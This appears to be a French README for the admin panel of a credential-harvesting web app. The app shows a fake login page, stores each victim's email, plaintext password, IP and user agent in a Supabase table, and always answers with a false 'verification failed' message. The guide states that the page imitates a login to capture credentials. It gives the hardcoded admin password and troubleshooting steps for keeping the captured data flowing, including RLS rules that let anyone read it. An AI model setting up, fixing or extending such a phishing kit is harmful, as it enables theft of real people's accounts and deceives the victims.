# Guide d'utilisation - Page Admin

## 🔐 Accès à la page Admin

### Étape 1 : Démarrer l'application
```bash
npm run dev
```

### Étape 2 : Accéder à la page admin
1. Ouvrez votre navigateur
2. Allez sur : `http://localhost:5173/admin`
3. Entrez le mot de passe : **`notaireFrance123`**
4. Cliquez sur "Se connecter"

## 📊 Visualiser les tentatives de connexion

Une fois connecté, vous verrez :
- **Un tableau** avec toutes les tentatives de connexion
- **Le nombre total** de tentatives en haut
- **Un bouton "🔄 Rafraîchir"** pour recharger les données
- **Un bouton "Déconnexion"** pour vous déconnecter

### Colonnes du tableau :
- **Email** : L'adresse email saisie
- **Mot de passe** : Le mot de passe tenté
- **Adresse IP** : L'adresse IP de l'utilisateur
- **User Agent** : Le navigateur utilisé
- **Date & Heure** : Quand la tentative a eu lieu

## 🐛 Dépannage

### Problème : "Aucune tentative de connexion enregistrée"

#### Solution 1 : Vérifier la connexion à Supabase
1. Ouvrez la console du navigateur (F12)
2. Allez sur la page d'accueil (`http://localhost:5173`)
3. Remplissez le formulaire avec un email et mot de passe
4. Cliquez sur "S'identifier"
5. Regardez dans la console :
   - ✅ Si vous voyez **"Login attempt logged successfully:"** → Les données sont enregistrées
   - ❌ Si vous voyez **"Error logging login attempt:"** → Il y a un problème de connexion

#### Solution 2 : Vérifier la base de données Supabase
1. Allez sur https://supabase.com/dashboard
2. Connectez-vous à votre projet
3. Allez dans **Table Editor**
4. Sélectionnez la table **`login_attempts`**
5. Vérifiez si des données y sont présentes

#### Solution 3 : Vérifier les politiques RLS
Dans Supabase, vérifiez que les politiques RLS (Row Level Security) sont bien configurées :
- Une politique **INSERT** qui permet à tout le monde d'insérer
- Une politique **SELECT** qui permet à tout le monde de lire

#### Solution 4 : Vérifier l'URL et la clé Supabase
Dans le fichier `src/integrations/supabase/client.ts`, vérifiez que :
- L'URL Supabase est correcte
- La clé API est correcte et valide

### Problème : "Erreur lors de l'enregistrement"

Cela signifie que l'insertion dans la base de données a échoué.

**Causes possibles :**
1. La table `login_attempts` n'existe pas
2. Les politiques RLS bloquent l'insertion
3. La connexion à Supabase est incorrecte
4. La clé API est expirée ou invalide

**Solution :**
1. Vérifiez que la migration a bien été exécutée dans Supabase
2. Exécutez le fichier `supabase/migrations/20250621162545-9ce17a08-4559-401e-8531-4d7fa0da8a1d.sql` dans l'éditeur SQL de Supabase

### Problème : Message "Echec de la vérification"

**C'est normal !** Ce message s'affiche toujours après la soumission du formulaire. C'est le comportement attendu du système (qui simule une fausse page de connexion pour capturer les identifiants).

Les données sont quand même enregistrées en base de données, même si ce message d'erreur s'affiche.

## 🔧 Commandes utiles

### Vérifier que Supabase est installé
```bash
npm list @supabase/supabase-js
```

### Réinstaller les dépendances
```bash
npm install
```

### Nettoyer et réinstaller
```bash
rm -rf node_modules package-lock.json
npm install
```

## 📝 Notes importantes

- **Mot de passe admin** : `notaireFrance123` (configurable dans `src/components/AdminAuth.tsx` ligne 14)
- **URL admin** : `/admin`
- Le message "Echec de la vérification" est normal et fait partie du fonctionnement du système
- Les données sont enregistrées dans Supabase, pas localement


